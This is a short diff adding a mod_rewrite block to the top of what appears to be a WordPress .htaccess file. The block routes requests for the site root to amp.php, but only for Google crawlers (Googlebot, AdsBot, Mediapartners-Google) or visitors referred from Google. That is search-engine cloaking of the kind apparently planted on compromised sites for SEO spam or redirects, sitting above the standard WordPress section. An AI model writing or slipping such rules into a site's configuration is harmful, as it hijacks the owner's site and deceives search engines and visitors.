@@ -1,3 +1,13 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} Googlebot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} AdsBot [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Mediapartners-Google [NC,OR]
+RewriteCond %{HTTP_USER_AGENT} Google- [NC,OR]
+RewriteCond %{HTTP_REFERER} google\. [NC]
+RewriteRule ^$ amp.php [L]
+</IfModule>
+
 
 # BEGIN WordPress
 # The directives (lines) between "BEGIN WordPress" and "END WordPress" are
